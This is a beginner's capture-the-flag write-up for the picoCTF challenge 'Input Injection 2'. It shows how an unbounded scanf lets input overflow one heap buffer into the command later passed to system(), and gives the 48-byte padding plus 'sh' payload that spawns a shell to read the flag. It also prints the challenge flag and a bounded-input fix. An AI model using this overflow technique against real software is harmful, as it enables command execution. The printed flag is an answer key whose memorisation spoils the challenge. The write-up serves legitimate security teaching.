# Challenge: Input Injection 2

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Platform:** picoCTF  

---

## üß™ Description

> This program greets you and then runs a command. But can you take control of what command it executes?

Our goal is to gain control over the command executed by `system()`.

---

## üë∂ Beginner's Note

I've only been learning cybersecurity for a few months.  
If my logic is incorrect or there is a better way to explain this, please feel free to teach me.  
I'm eager to learn from more experienced hackers.

---

## üìå Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char* username = malloc(28);
    char* shell = malloc(28);

    printf("username at %p\n", username);
    fflush(stdout);
    printf("shell at %p\n", shell);
    fflush(stdout);

    strcpy(shell, "/bin/pwd");

    printf("Enter username: ");
    fflush(stdout);
    scanf("%s", username);

    printf("Hello, %s. Your shell is %s.\n", username, shell);
    system(shell);
    fflush(stdout);

    return 0;
}
```

---

## üîç Vulnerability Analysis

First, I tried to enter a very long input:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

This is what I got:

```
username at 0x484b2a0
shell at 0x484b2d0
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Your shell is AAAAAAAAAAAAAAAA.
sh: 1: AAAAAAAAAAAAAAAA: not found
```

The length of `A` printed in `shell` is 16 bytes.  
So:

```
64 - 16 = 48
```

This means after 48 bytes, my input starts overwriting the `shell` buffer.

---

## üß™ Overwriting the Command

Next, I tried to overwrite `shell` with a command:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls
```

This is what I got:

```
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls. Your shell is ls.
flag.txt
```

This shows that I successfully overwrote the `shell` variable.

---

## ‚ùó Limitation

The `scanf` function with `%s` reads input until it encounters whitespace, but it does not check whether the input fits in the allocated buffer.

Because of this, the following input cannot be used:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag.txt
```

---

## üõ†Ô∏è Exploitation Strategy

To bypass this limitation, I overwrote `shell` with `sh`:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsh
```

This spawns a shell, allowing me to execute commands manually.

```
username at 0xec712a0
shell at 0xec712d0
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsh
ls
flag.txt
cat flag.txt
picoCTF{FLAG}
```

---

## üõ°Ô∏è How to Fix

To prevent this vulnerability, safer input handling should be used:

- Use `fgets()`
- Or limit input size:
```c
scanf("%27s", username);
```

---

## üö© Flag

```
picoCTF{us3rn4m3_2_sh3ll_809f901a}
```

---

## üí° What I Learned

- How the `sh` command works
- Why `scanf("%s")` is dangerous without length limits
- The concept of heap overflow to control program execution
